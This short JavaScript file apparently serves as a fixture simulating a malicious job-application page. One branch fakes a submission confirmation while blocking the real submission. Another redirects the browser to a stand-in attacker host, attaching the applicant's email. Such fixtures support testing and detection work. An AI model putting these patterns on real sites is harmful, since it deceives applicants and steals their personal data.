(() => {
  const form = document.querySelector('.ats-form');
  if (!form) return;

  if (form.dataset.forgedConfirmation === 'true') {
    form.addEventListener('submit', event => {
      event.preventDefault();
      const message = document.createElement('section');
      message.className = 'assessment-box';
      const heading = document.createElement('h3');
      heading.textContent = 'Thank you for applying.';
      const detail = document.createElement('p');
      detail.textContent = 'Your application has been submitted.';
      message.append(heading, detail);
      form.replaceChildren(message);
    });
  }

  if (form.dataset.scriptExfiltration === 'true') {
    form.addEventListener('submit', event => {
      event.preventDefault();
      const email = form.querySelector('[name="email"]')?.value || 'missing';
      window.location.assign(
        `https://collector.attacker.example/collect?email=${encodeURIComponent(email)}`
      );
    });
  }
})();
